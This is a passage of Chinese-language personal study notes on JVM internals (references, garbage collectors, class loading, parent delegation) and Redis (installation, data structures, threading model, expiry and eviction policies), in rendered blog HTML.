class="string">&quot;abc&quot;</span>);</span><br><span class="line">SoftReference&lt;String&gt; softReference = <span class="keyword">new</span> <span class="title class_">SoftReference</span>&lt;String&gt;(str);</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">WeakReference&lt;String&gt; weakReference = <span class="keyword">new</span> <span class="title class_">WeakReference</span>&lt;&gt;(str);</span><br><span class="line"><span class="comment">// 弱引用转强引用</span></span><br><span class="line"><span class="type">String</span> <span class="variable">strongReference</span> <span class="operator">=</span> weakReference.get();</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"><span class="type">ReferenceQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceQueue</span>();</span><br><span class="line"><span class="comment">// 创建虚引用，要求必须与一个引用队列关联</span></span><br><span class="line"><span class="type">PhantomReference</span> <span class="variable">pr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PhantomReference</span>(str, queue);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://juejin.cn/post/6844903665241686029">https://juejin.cn/post/6844903665241686029</a></p>
<h3 id="判断常量是否是废弃常量"><a href="#判断常量是否是废弃常量" class="headerlink" title="判断常量是否是废弃常量"></a>判断常量是否是废弃常量</h3><p>假如在字符串常量池中存在字符串 “abc”，如果当前没有任何 String 对象引用该字符串常量的话，就说明常量 “abc” 就是废弃常量，如果这时发生内存回收的话而且有必要的话，”abc” 就会被系统清理出常量池了。</p>
<h3 id="判断一个类是无用的类"><a href="#判断一个类是无用的类" class="headerlink" title="判断一个类是无用的类"></a>判断一个类是无用的类</h3><p>满足三个条件才可以被回收; java堆不存在任何该类的实例; 该类的classloader已经被回收;该类的java.lang.Class对象没有在任何地方被引用,无法在任何地方通过反射访问该类的方法;</p>
<h2 id="垃圾回收算法"><a href="#垃圾回收算法" class="headerlink" title="垃圾回收算法"></a>垃圾回收算法</h2><p>标记清除算法: 标记需要不清除的对象,然后清除没有被标记的对象, 也可以标记不需要清除的对象, 然后清除未被标记的对象; 缺点:  内存碎片很多, 执行效率不稳定, 如果有大量对象需要清除, 这时就需要进行大量的标记和清除动作,导致标记和清除这两个过程的执行效率随对象数量增加而降低;</p>
<p>标记复制算法: 内存分为两块,将存活的对象复制到另一块空间,然后将原来这块空间全部清除; 缺点: 会浪费空间</p>
<p>标记整理算法: 老年代使用;将对象往一端移动,直接清理掉端边界以外的内存; 整理的过程比较耗时;</p>
<p>分代收集算法: 在新生代中，每次收集都会有大量对象死去，所以可以选择”标记-复制“算法，只需要付出少量对象的复制成本就可以完成每次垃圾收集。而老年代的对象存活几率是比较高的，而且没有额外的空间对它进行分配担保，所以我们必须选择“标记-清除”或“标记-整理”算法进行垃圾收集;</p>
<h2 id="垃圾收集器"><a href="#垃圾收集器" class="headerlink" title="垃圾收集器"></a>垃圾收集器</h2><p>Serial : 单线程,需要暂停其他工作线程,没有线程切换的开销,效率高,新标记复制,老标记整理;适用运行在 Client 模式下的虚拟机; </p>
<p>ParNew: serial的多线程版本,新标记复制,老标记整理;server模式下适用; </p>
<p>Parallel Scavenge: 关注cpu吞吐量,新标记复制,老标记整理,jdk 8默认;</p>
<p>serial old: Serial的老年代版本;</p>
<p>Parallel Old: Parallel Scavenge的老年代版本</p>
<h3 id="CMS-concurrent-mark-sweep"><a href="#CMS-concurrent-mark-sweep" class="headerlink" title="CMS(concurrent mark sweep)"></a>CMS(concurrent mark sweep)</h3><p>注重用户体验,为了获取最短停顿时间;是hotspot虚拟机第一款并发收集器,第一次实现让垃圾收集线程和用户线程基本上同时工作; 老标记清除,只收集老年代垃圾;</p>
<ul>
<li>初始标记： 暂停所有的其他线程，并记录下直接与 root 相连的对象，速度很快 ；</li>
<li>并发标记： 同时开启 GC 和用户线程，用一个闭包结构去记录可达对象。但在这个阶段结束，这个闭包结构并不能保证包含当前所有的可达对象。因为用户线程可能会不断的更新引用域，所以 GC 线程无法保证可达性分析的实时性。所以这个算法里会跟踪记录这些发生引用更新的地方。</li>
<li>重新标记： 重新标记阶段就是为了修正并发标记期间因为用户程序继续运行而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一般会比初始标记阶段的时间稍长，远远比并发标记阶段时间短</li>
<li>并发清除： 开启用户线程，同时 GC 线程开始对未标记的区域做清扫。</li>
</ul>
<p>从它的名字就可以看出它是一款优秀的垃圾收集器，主要优点：并发收集、低停顿。但是它有下面三个明显的缺点：</p>
<ul>
<li>对 CPU 资源敏感；</li>
<li>无法处理浮动垃圾；</li>
<li>它使用的回收算法-“标记-清除”算法会导致收集结束时会有大量空间碎片产生。</li>
</ul>
<h3 id="G1收集器"><a href="#G1收集器" class="headerlink" title="G1收集器"></a>G1收集器</h3><p>G1 (Garbage-First) 是一款面向服务器的垃圾收集器,主要针对配备多颗处理器及大容量内存的机器. 以极高概率满足 GC 停顿时间要求的同时,还具备高吞吐量性能特征. 能独立管理整个 GC 堆;</p>
<p>被视为 JDK1.7 中 HotSpot 虚拟机的一个重要进化特征。它具备以下特点：</p>
<ul>
<li>并行与并发：G1 能充分利用 CPU、多核环境下的硬件优势，使用多个 CPU（CPU 或者 CPU 核心）来缩短 Stop-The-World 停顿时间。部分其他收集器原本需要停顿 Java 线程执行的 GC 动作，G1 收集器仍然可以通过并发的方式让 java 程序继续执行。</li>
<li>分代收集：虽然 G1 可以不需要其他收集器配合就能独立管理整个 GC 堆，但是还是保留了分代的概念。</li>
<li>空间整合：与 CMS 的“标记-清理”算法不同，G1 从整体来看是基于“标记-整理”算法实现的收集器；从局部上来看是基于“标记-复制”算法实现的。</li>
<li>可预测的停顿：这是 G1 相对于 CMS 的另一个大优势，降低停顿时间是 G1 和 CMS 共同的关注点，但 G1 除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为 M 毫秒的时间片段内。</li>
</ul>
<p>G1 收集器的运作大致分为以下几个步骤：</p>
<ul>
<li>初始标记</li>
<li>并发标记</li>
<li>最终标记</li>
<li>筛选回收</li>
</ul>
<p>G1 收集器在后台维护了一个优先列表，每次根据允许的收集时间，优先选择回收价值最大的 Region(这也就是它的名字 Garbage-First 的由来) 。这种使用 Region 划分内存空间以及有优先级的区域回收方式，保证了 G1 收集器在有限时间内可以尽可能高的收集效率（把内存化整为零）。</p>
<h3 id="ZGC-收集器"><a href="#ZGC-收集器" class="headerlink" title="ZGC 收集器"></a>ZGC 收集器</h3><p>与 CMS 中的 ParNew 和 G1 类似，ZGC 也采用标记-复制算法，不过 ZGC 对该算法做了重大改进。</p>
<p>在 ZGC 中出现 Stop The World 的情况会更少！</p>
<h2 id="class类文件结构"><a href="#class类文件结构" class="headerlink" title="class类文件结构"></a>class类文件结构</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassFile &#123;</span><br><span class="line">    u4             magic; <span class="comment">//Class 文件的标志</span></span><br><span class="line">    u2             minor_version;<span class="comment">//Class 的小版本号</span></span><br><span class="line">    u2             major_version;<span class="comment">//Class 的大版本号</span></span><br><span class="line">    u2             constant_pool_count;<span class="comment">//常量池的数量</span></span><br><span class="line">    cp_info        constant_pool[constant_pool_count-<span class="number">1</span>];<span class="comment">//常量池</span></span><br><span class="line">    u2             access_flags;<span class="comment">//Class 的访问标记</span></span><br><span class="line">    u2             this_class;<span class="comment">//当前类</span></span><br><span class="line">    u2             super_class;<span class="comment">//父类</span></span><br><span class="line">    u2             interfaces_count;<span class="comment">//接口</span></span><br><span class="line">    u2             interfaces[interfaces_count];<span class="comment">//一个类可以实现多个接口</span></span><br><span class="line">    u2             fields_count;<span class="comment">//Class 文件的字段属性</span></span><br><span class="line">    field_info     fields[fields_count];<span class="comment">//一个类会可以有多个字段</span></span><br><span class="line">    u2             methods_count;<span class="comment">//Class 文件的方法数量</span></span><br><span class="line">    method_info    methods[methods_count];<span class="comment">//一个类可以有个多个方法</span></span><br><span class="line">    u2             attributes_count;<span class="comment">//此类的属性表中的属性数</span></span><br><span class="line">    attribute_info attributes[attributes_count];<span class="comment">//属性表集合</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="类加载过程"><a href="#类加载过程" class="headerlink" title="类加载过程"></a>类加载过程</h2><p>一个类的完整生命周期中:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848914.png" alt="img"></p>
<h3 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h3><p> 通过全类名获取定义此类的二进制字节流; 将字节流转换为方法区的运行时数据结构; 在内存中生成一个代表该类的Class对象,作为方法区这些数据的访问入口;</p>
<p>一个非数组类的加载阶段（加载阶段获取类的二进制字节流的动作）是可控性最强的阶段，这一步我们可以去完成还可以自定义类加载器去控制字节流的获取方式（重写一个类加载器的 loadClass() 方法）。数组类型不通过类加载器创建，它由 Java 虚拟机直接创建。</p>
<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>验证文件是否符合JVM规范</p>
<p> 文件格式验证(类名,主次版本号); 元数据验证(对字节码描述信息进行语义分析,final); 字节码验证(最复杂的阶段,确定程序语义是合法的、符合逻辑的); 符号引用验证(确保解析动作能正确执行)</p>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>静态变量赋初始值</p>
<p>给static赋默认值,如果加了final关键字就是赋指定的值;</p>
<h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>将类、属性、方法等符号引用解析为直接饮用，常量池中的各种符号引用解析为指针、偏移量等内存地址的直接引用</p>
<p>讲常量池内的符号引用替换为直接引用的过程; 解析动作主要针对类或接口、字段、类方法、接口方法、方类型、方法句柄和调用限定符7类符号引用进行; </p>
<p>符号引用就是一组符号来描述目标，可以是任何字面量。<strong>直接引用</strong>就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。在程序实际运行时，只有符号引用是不够的，举个例子：在程序执行方法时，系统需要明确知道这个方法所在的位置。Java 虚拟机为每个类都准备了一张方法表来存放类中所有的方法。当需要调用一个类的方法的时候，只要知道这个方法在方法表中的偏移量就可以直接调用该方法了。通过解析操作符号引用就可以直接转变为目标方法在类中方法表的位置，从而使得方法可以被调用。</p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>执行初始化方法<clinit>()方法的过程; 这个方法是带锁线程安全的,在多线程的环境下可能会引发死锁,这种死锁是很难发现的; </p>
<p>虚拟机严格规范了下面几种情况下必须对类进行初始化</p>
<p>1.当遇到new、getstatic、putstatic、invokestatic这4条字节码指令时</p>
<p>2.使用反射时</p>
<p>3.初始化一个类,如果其父类还没有初始化,则先出发该父类的初始化</p>
<p>4.当虚拟机启动时,用户需要定义一个执行的主类,虚拟机乎先初始化这个类</p>
<p>5.MethodHandle和VarHandle可以看作是轻量级的反射调用机制,要想使用这两个调用,就必须先使用findstaticVarHandle来初始化要调用的类</p>
<p>6.当一个接口中定义了JDK8新加入的默认方法(被default关键字修饰的接口方法)时,如果有这个接口的实现类发生了初始化,那该接口要在其之前被初始化</p>
<h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><p>卸载类即该类的Class对象被GC</p>
<p>卸载类需要满足3个条件</p>
<p>1.该类的所有实例对象都已被GC,也就是说堆不存在该类的实例对象</p>
<p>2.该类没有在其他地方别引用</p>
<p>3.该类的类加载器的实例已被GC</p>
<p>所以，在JVM生命周期类，由jvm自带的类加载器加载的类是不会被卸载的。但是由我们自定义的类加载器加载的类是可能被卸载的。</p>
<p>只要想通一点就好了，jdk自带的BootstrapClassLoader, ExtClassLoader, AppClassLoader负责加载jdk提供的类，所以它们(类加载器的实例)肯定不会被回收。而我们自定义的类加载器的实例是可以被回收的，所以使用我们自定义加载器加载的类是可以被卸载掉的。</p>
<h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>java.lang.ClassLoader内置了三个ClassLoader</p>
<p>BootstrapClassLoader(启动类加载器): 最顶层的加载类,由C++实现,负责加载%JAVA_HOME%&#x2F;lib目录下的jar包和类或者被-Xbootclasspath参数指定路径中的所有类;</p>
<p>ExtensionClassLoader(扩展类加载器): 主要负责加载目录%JRE_HOME%&#x2F;lib&#x2F;ext目录下的jar包和类,或被java.ext.dirs系统变量所指定的路径下的jar包</p>
<p>AppClassLoader(应用程序类加载器): 面向我们用户的加载器,负责加载当前应用classpath下的所有jar包和类</p>
<h3 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h3><p>每个类都有一个对应它的类加载器; 系统中的ClassLoader在协同工作的时候会默认使用双亲委派模型. 即在类加载的时候, 系统会首先判断当前类是否被加载过. 已经被加载的类会直接返回,否则才会尝试加载. 加载的时候,会把请求委派给父类加载器的loadClass() 处理, 因此所有请求最终都应该传送到顶层的启动类加载器.当父类加载器无法处理时,才由自己来处理. 当父类加载器为null时,会使用启动类加载器bootstrapClassLoader作为父类加载器.</p>
<h3 id="双亲委派模型的好处"><a href="#双亲委派模型的好处" class="headerlink" title="双亲委派模型的好处"></a>双亲委派模型的好处</h3><p>可以保证java程序的稳定运行,可以避免类的重复加载(JVM区分不同类的方式不仅仅根据类名, 相同的类文件被不同的类加载器加载产生的是两个不同的类),也保证了Java核心API不被篡改; 如果没有使用双亲委派模型,而是每个类加载器加载自己的话就会出现一些问题,比如我们编写一个java.lang.Object类的话,那么程序运行的时候,系统就会出现多个不同的Object类</p>
<h3 id="如果我们不想用双亲委派模型怎么办"><a href="#如果我们不想用双亲委派模型怎么办" class="headerlink" title="如果我们不想用双亲委派模型怎么办?"></a>如果我们不想用双亲委派模型怎么办?</h3><p>自定义类加载器的话,需要继承ClassLoader. 如果我们不想打破双亲委派模型,就重写ClassLoader类中的findClass()方法即可,无法被父类加载器加载的类最终会通过这个方法被加载. 但是,如果要打破双亲委派机制模型则需要重写loadClass()方法.</p>
<p>破坏性双亲委派模型的经典案例（JDBC）<br>原生的JDBC中Driver驱动本身只是一个接口，并没有具体的实现，具体的实现是由不同数据库类型去实现的。例如，MySQL的mysql-connector-.jar中的Driver类具体实现的。 原生的JDBC中的类是放在rt.jar包的，是由启动类加载器进行类加载的，在JDBC中的Driver类中需要动态去加载不同数据库类型的Driver类，而mysql-connector-.jar中的Driver类是用户自己写的代码，那启动类加载器肯定是不能进行加载的，既然是自己编写的代码，那就需要由应用程序启动类去进行类加载。于是乎，这个时候就引入线程上下文件类加载器(Thread Context ClassLoader)。有了这个东西之后，程序就可以把原本需要由启动类加载器进行加载的类，由应用程序类加载器去进行加载了。</p>
<h3 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h3><p>除了BootstrapClassLoader其他类加载器均由java实现,且全部继承自java.lang.ClassLoader. 如果要定义自己的类加载器,就需要继承ClassLoader.</p>
<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><p>epoll-wait redis不阻塞， nginx会阻塞，因为mater负责连接，worker工作，所以不需要非阻塞</p>
<p>采用弱一致性,因为是缓存</p>
<p>最终一致性（没有用这种）</p>
<p>做云原生，动态扩缩容，需要服务无状态，随意加服务器；</p>
<h2 id="Redis-6-2-2"><a href="#Redis-6-2-2" class="headerlink" title="Redis 6.2.2"></a>Redis 6.2.2</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">下载和编译的过程</span></span><br><span class="line">wget https://download.redis.io/releases/redis-6.2.2.tar.gz</span><br><span class="line">tar xzf redis-6.2.2.tar.gz</span><br><span class="line">cd redis-6.2.2 &amp;&amp; vi README.md</span><br><span class="line">make</span><br><span class="line">yum install gcc -y</span><br><span class="line">make distclean</span><br><span class="line">make</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">安装过程</span></span><br><span class="line">make PREFIX=/opt/bigdata/redis6 install</span><br><span class="line">vi /etc/profile</span><br><span class="line">export REDIS_HOME=/opt/bigdata/redis6</span><br><span class="line">export PATH=$PATH:$REDIS_HOME/bin</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br><span class="line">cd utils</span><br><span class="line">./install_server.sh</span><br></pre></td></tr></table></figure>



<h2 id="Redis简介"><a href="#Redis简介" class="headerlink" title="Redis简介"></a>Redis简介</h2><p>使用c语言开发的数据库, 数据存在内存中,所以读写速度非常快,因此redis被广泛应用在缓存方向; 分布式锁, 甚至消息队列; 支持事务,持久化,lua脚本,多种集群方案; </p>
<h2 id="分布式缓存常见技术选型方案有哪些"><a href="#分布式缓存常见技术选型方案有哪些" class="headerlink" title="分布式缓存常见技术选型方案有哪些?"></a>分布式缓存常见技术选型方案有哪些?</h2><p>Memcached和redis , 分布式缓存主要解决单机缓存的容量受服务器限制并且无法保存通用的信息; 因为, 本地缓存只在当前服务有效, 比如 如果你部署了两个相同的服务,他们两者之间的缓存数据是无法共通的</p>
<h2 id="Redis和Memcached"><a href="#Redis和Memcached" class="headerlink" title="Redis和Memcached"></a>Redis和Memcached</h2><p>相同点: 基于内存, 用作缓存; 都有过期策略; 性能都比较高;</p>
<p>区别: </p>
<p>redis支持更丰富的数据类型, string, list, hash, set, sorted set, bitmap;  M只支持最简单的k&#x2F;v数据类型</p>
<p>redis支持持久化; redis有容灾恢复机制,因为可以持久化; m在服务器内存用完后报异常,r可以将不用的数据放到磁盘; </p>
<p>redis原生支持cluster模式, m不行,得靠客户端来实现往集群中分片写入数据; </p>
<p>redis使用单线程多路io复用模型(redis6 引入多线程io, 默认是关闭的), m是多线程非阻塞io复用模型</p>
<p>redis支持发布订阅模型, lua脚本, 事务等特性, 而m不支持, redis还支持更多的编程语言</p>
<p>redis过期删除策略同时使用惰性删除和定期删除, 而m只用惰性删除</p>
<p>redis计算向数据移动, 能直接取到字符串中的某个值, 而m只会返回整个数组, 浪费网络io资源;</p>
<h2 id="为什么要用缓存-redis"><a href="#为什么要用缓存-redis" class="headerlink" title="为什么要用缓存(redis)"></a>为什么要用缓存(redis)</h2><p>高性能, 高并发, mysql qps 1w(4核8g), 用redis能到10w+,甚至30w+(单机)</p>
<h2 id="Redis常用数据结构"><a href="#Redis常用数据结构" class="headerlink" title="Redis常用数据结构"></a>Redis常用数据结构</h2><p>string: set mset mget get strlen exists  incr setex del expire setex ttl; 需要计数的场景, 用户访问次数,热点文章的点赞转发数量等</p>
<p>list : rpush pop plush pop lrange llen; 双向链表; 发布与订阅或者消息队列,慢查询;</p>
<p>hash : hset hmset exists hget hgetall keys hvals; hashmap; 系统中的对象存储</p>
<p>set : sadd spop smembers sismember scard sinterstore sunion; 需要存放的数据不能重复以及需要获取多个数据源交集和并集等场景, 共同好友(交集), 推荐好友(差集)，尽量不用，交集和差集都耗时；</p>
<p>sorted set: zadd zcard score range zrevrange zrem; 通过设置的权重排序,默认升序, 权重一样则按acsii码排序; 需要对数据根据某个权重进行排序的场景, 比如直播系统中, 实时排行信息包含直播间在线用户列表, 各种礼物排行榜, 弹幕消息(可以理解为按消息维度的消息排行榜)等信息; </p>
<p>bitmap: setbit    getbit bitcount bitop; 是否签到,是否登录, 活跃用户情况, 用户行为统计(是否点赞过某个视频) </p>
<h2 id="Skiplist跳表-zset"><a href="#Skiplist跳表-zset" class="headerlink" title="Skiplist跳表(zset)"></a>Skiplist跳表(zset)</h2><p>查询是否为skiplist: OBJECT encoding k1;  </p>
<p>数据很少为ziplist, 数据多的话会变为skiplist</p>
<p>最高32层; 跳表就是链表与二分法的结合; 链表从头节点到尾节点都是有序的 ;可以进行跳跃查找（形如二分法），降低时间复杂度; 建立索引使用抛硬币的方式决定; 每个节点有50%概率会被提拔; 大体上索引是均匀的; 删除是(O(n))时,自上向下, 查找第一次出现节点的索引,并逐层找到每一层对应的节点, 如果该层只有一个节点,则删除整层; </p>
<p>相比于二叉查找树，跳表维持结构平衡的成本比较低，完全靠随机。而二叉查找树需要Rebalance来重新调整平衡的结构</p>
<h2 id="Redis单线程模型详解"><a href="#Redis单线程模型详解" class="headerlink" title="Redis单线程模型详解"></a>Redis单线程模型详解</h2><p><strong>Redis 基于 Reactor 模式来设计开发了自己的一套高效的事件处理模型</strong> （Netty 的线程模型也基于 Reactor 模式，Reactor 模式不愧是高性能 IO 的基石），这套事件处理模型对应的是 Redis 中的文件事件处理器（file event handler）。由于文件事件处理器（file event handler）是单线程方式运行的，所以我们一般都说 Redis 是单线程模型。</p>
<p><strong>既然是单线程，那怎么监听大量的客户端连接呢？</strong></p>
<p>Redis 通过<strong>IO 多路复用程序</strong> 来监听来自客户端的大量连接（或者说是监听多个 socket），它会将感兴趣的事件及类型(读、写）注册到内核中并监听每个事件是否发生。</p>
<p>这样的好处非常明显： I&#x2F;O 多路复用技术的使用让 Redis 不需要额外创建多余的线程来监听客户端的大量连接，降低了资源的消耗（和 NIO 中的 Selector 组件很像）。</p>
<p>另外， Redis 服务器是一个事件驱动程序，服务器需要处理两类事件： 1. 文件事件; 2. 时间事件。</p>
<p>时间事件不需要多花时间了解，我们接触最多的还是<strong>文件事件</strong>（客户端进行读取写入等操作，涉及一系列网络通信）。</p>
<p>《Redis 设计与实现》有一段话是如是介绍文件事件的</p>
<blockquote>
<p>Redis 基于 Reactor 模式开发了自己的网络事件处理器：这个处理器被称为文件事件处理器（file event handler）。文件事件处理器使用 I&#x2F;O 多路复用（multiplexing）程序来同时监听多个套接字，并根据 套接字目前执行的任务来为套接字关联不同的事件处理器。</p>
<p>当被监听的套接字准备好执行连接应答（accept）、读取（read）、写入（write）、关 闭（close）等操作时，与操作相对应的文件事件就会产生，这时文件事件处理器就会调用套接字之前关联好的事件处理器来处理这些事件。</p>
<p><strong>虽然文件事件处理器以单线程方式运行，但通过使用 I&#x2F;O 多路复用程序来监听多个套接字</strong>，文件事件处理器既实现了高性能的网络通信模型，又可以很好地与 Redis 服务器中其他同样以单线程方式运行的模块进行对接，这保持了 Redis 内部单线程设计的简单性。</p>
</blockquote>
<p>可以看出，文件事件处理器（file event handler）主要是包含 4 个部分：</p>
<ul>
<li>多个 socket（客户端连接）</li>
<li>IO 多路复用程序（支持多个客户端连接的关键）<a href="#epoll">跳到epoll</a></li>
<li>文件事件分派器（将 socket 关联到相应的事件处理器）</li>
<li>事件处理器（连接应答处理器、命令请求处理器、命令回复处理器）</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848587.png" alt="redis事件处理器"></p>
<h3 id="Redis的单线程的问题"><a href="#Redis的单线程的问题" class="headerlink" title="Redis的单线程的问题"></a>Redis的单线程的问题</h3><p>不要使用像getAll这种命令,会耗时很久</p>
<h2 id="Reactor"><a href="#Reactor" class="headerlink" title="Reactor"></a>Reactor</h2><p>单Reactor单线程</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848602.png" alt="img"></p>
<p>多线程的Reactor</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848607.png" alt="img"></p>
<p>主从Reactor多线程</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848694.png" alt="img"></p>
<h2 id="Redis为什么不使用多线程"><a href="#Redis为什么不使用多线程" class="headerlink" title="Redis为什么不使用多线程?"></a>Redis为什么不使用多线程?</h2><p>Redis4.0 增加的多线程主要是针对一些大键值对的删除操作的命令, 使用这些命令就会使用主线程之外的其他线程来“异步处理”; 例如 UNLINK、FLUSHALL ASYNC、FLUSHDB ASYNC 等非阻塞的删除操作。对于 Redis 中的一些超大键值对，几十 MB 或者几百 MB 的数据并不能在几毫秒的时间内处理完，Redis 可能会需要在释放内存空间上消耗较多的时间，这些操作就会阻塞待处理的任务，影响 Redis 服务处理请求的速度和可用性</p>
<p>单线程编程容易并且更容易维护;省去了很多上下文切换线程的时间, Redis的性能瓶颈不在cpu,主要在内存和网络; 多线程就会存在死锁、线程上下文切换等问题,甚至会影响性能;</p>
<p><strong>1.官方答案</strong></p>
<p>因为Redis是基于内存的操作，CPU不是Redis的瓶颈，Redis的瓶颈最有可能是机器内存的大小或者网络带宽。既然单线程容易实现，而且CPU不会成为瓶颈，那就顺理成章地采用单线程的方案了。</p>
<p><strong>2.性能指标</strong></p>
<p>关于redis的性能，官方网站也有，普通笔记本轻松处理每秒几十万的请求。</p>
<p><strong>3.详细原因</strong></p>
<p><strong>1）不需要各种锁的性能消耗</strong></p>
<p>Redis的数据结构并不全是简单的Key-Value，还有list，hash等复杂的结构，这些结构有可能会进行很细粒度的操作，比如在很长的列表后面添加一个元素，在hash当中添加或者删除一个对象。这些操作可能就需要加非常多的锁，导致的结果是同步开销大大增加。</p>
<p>总之，在单线程的情况下，就不用去考虑各种锁的问题，不存在加锁释放锁操作，没有因为可能出现死锁而导致的性能消耗。</p>
<p><strong>2）单线程多进程集群方案</strong></p>
<p>单线程的威力实际上非常强大，每核心效率也非常高，多线程自然是可以比单线程有更高的性能上限，但是在今天的计算环境中，即使是单机多线程的上限也往往不能满足需要了，需要进一步摸索的是多服务器集群化的方案，这些方案中多线程的技术照样是用不上的。</p>
<p><strong>所以单线程、多进程的集群不失为一个时髦的解决方案。</strong></p>
<p><strong>3）CPU消耗</strong></p>
<p>采用单线程，避免了不必要的上下文切换和竞争条件，也不存在多进程或者多线程导致的切换而消耗 CPU。</p>
<p>但是如果CPU成为Redis瓶颈，或者不想让服务器其他CUP核闲置，那怎么办？</p>
<p>可以考虑多起几个Redis进程，Redis是key-value数据库，不是关系数据库，数据之间没有约束。只要客户端分清哪些key放在哪个Redis进程上就可以了。</p>
<h2 id="Redis单线程的优劣势"><a href="#Redis单线程的优劣势" class="headerlink" title="Redis单线程的优劣势"></a>Redis单线程的优劣势</h2><p><strong>单进程单线程优势</strong></p>
<ol>
<li>代码更清晰，处理逻辑更简单</li>
<li>不用去考虑各种锁的问题，不存在加锁释放锁操作，没有因为可能出现死锁而导致的性能消耗</li>
<li>不存在多进程或者多线程导致的切换而消耗CPU</li>
</ol>
<p><strong>单进程单线程弊端</strong></p>
<ol>
<li>无法发挥多核CPU性能，不过可以通过在单机开多个Redis实例来完善；</li>
</ol>
<h2 id="Redis6为什么引入多线程"><a href="#Redis6为什么引入多线程" class="headerlink" title="Redis6为什么引入多线程?"></a>Redis6为什么引入多线程?</h2><p>主要是为了提高网络IO读写性能, 因为这个算是redis中的一个性能瓶颈; redis的多线程只是在网络数据的读写这类耗时操作上使用, 执行命令仍然是单线程顺序执行, 因此不需要担心线程安全问题;</p>
<p>io-threads-do-reads yes  io-threads 4#4核建议设置2-3,8核设置6个线程;使用多线程充分利用多核;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848808.png" alt="下载"></p>
<h2 id="Redis给缓存数据设置过期时间有啥用"><a href="#Redis给缓存数据设置过期时间有啥用" class="headerlink" title="Redis给缓存数据设置过期时间有啥用"></a>Redis给缓存数据设置过期时间有啥用</h2><p>内存有限; 业务需求,短信验证码1分钟有效, jwt30分钟有效;</p>
<h2 id="Redis是如何判断数据是否过期的"><a href="#Redis是如何判断数据是否过期的" class="headerlink" title="Redis是如何判断数据是否过期的?"></a>Redis是如何判断数据是否过期的?</h2><p>用过期字典(类似hash表)来保存. 过期字典的键指向 Redis 数据库中的某个 key(键)，过期字典的值是一个 long long 类型的整数，这个整数保存了 key 所指向的数据库键的过期时间（毫秒精度的 UNIX 时间戳）。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848879.png" alt="redis过期时间"></p>
<h2 id="Redis删除策略"><a href="#Redis删除策略" class="headerlink" title="Redis删除策略?"></a>Redis删除策略?</h2><p>惰性删除: 只会在取出key的时候才对数据进行过期检查. 这样对CPU最友好,但是可能会造成大量的过期key没有被删除;</p>
<p>定期删除: 每隔一段时间抽取出一批key执行删除过期key操作. 并且, redis底层会通过限制删除操作执行的时长和频率来减少删除操作对CPU时间的影响</p>
<p>定期删除对内存友好,惰性删除对cpu友好, redis采用定期删除+ 惰性删除的方式</p>
<h2 id="Redis内存淘汰机制"><a href="#Redis内存淘汰机制" class="headerlink" title="Redis内存淘汰机制?"></a>Redis内存淘汰机制?</h2><p>仅仅通过给 key 设置过期时间还是有问题的。因为还是可能存在定期删除和惰性删除漏掉了很多过期 key 的情况。这样就导致大量过期 key 堆积在内存里，然后就 Out of memory 了。</p>
<p>怎么解决这个问题呢？答案就是： <strong>Redis 内存淘汰机制。</strong></p>
<p>Redis 提供 6 种数据淘汰策略：</p>
<ol>
<li><strong>volatile-lru（least recently used）</strong>：从已设置过期时间的数据集（server.db[i].expires）中挑选最近最少使用的数据淘汰</li>
<li><strong>volatile-ttl</strong>：从已设置过期时间的数据集（server.db[i].expires）中挑选将要过期的数据淘汰</li>
<li><strong>volatile-random</strong>：从已设置过期时间的数据集（server.db[i].expires）中任意选择数据淘汰</li>
<li><strong>allkeys-lru（least recently used）</strong>：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的 key（这个是最常用的）</li>
<li><strong>allkeys-random</strong>：从数据集（server.db[i].dict）中任意选择数据淘汰</li>
<li><strong>no-eviction</strong>：禁止驱逐数据，也就是说当内存不足以容纳新写入数据时，新写入操作会报错。这个应该没人使用吧！</li>
</ol>
<p>4.0 版本后增加以下两种：</p>
<ol>
<li><strong>volatile-lfu（least frequently used）</strong>：从已设置过期时间的数据集(server.db[i].expires)中挑选最不经常使用的数据淘汰</li>
